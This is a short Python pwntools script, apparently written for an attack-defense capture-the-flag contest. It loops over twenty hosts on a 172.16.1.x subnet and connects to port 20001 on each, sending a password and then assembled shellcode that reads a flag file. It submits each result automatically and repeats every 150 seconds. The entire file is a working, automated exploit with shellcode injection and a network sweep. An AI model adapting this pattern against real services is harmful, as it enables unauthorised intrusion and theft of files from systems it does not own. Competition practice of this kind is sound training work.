#!/usr/bin/env python

from pwn import *
import sys, struct, time
import submit



def exploit(ip):
	try:
		p = remote(ip, 20001)

		shellcode = shellcraft.linux.cat("/home/company/flag", 1)  #cat file
		shellcode = asm(shellcode)

		p.recvuntil('Show me your code:\n')
		p.sendline('5678')
		p.recvuntil('bd...heiheihei\n')
		p.sendline(shellcode)
	
		ans = p.recvline()
		p.close()
		return ans
	except:
		print "except"
		return ""

def do():
	for i in range (1, 21):
		try:
			ans = exploit("172.16.1.%d" % (i)).strip()
			print ans
			submit.submit(ans)
		except:
			continue


while True:
	do()
	time.sleep(150)

#for i in range (1,21):
#	ans = exploit("172.16.1.%d"%(i))
#        submit.submit(ans)
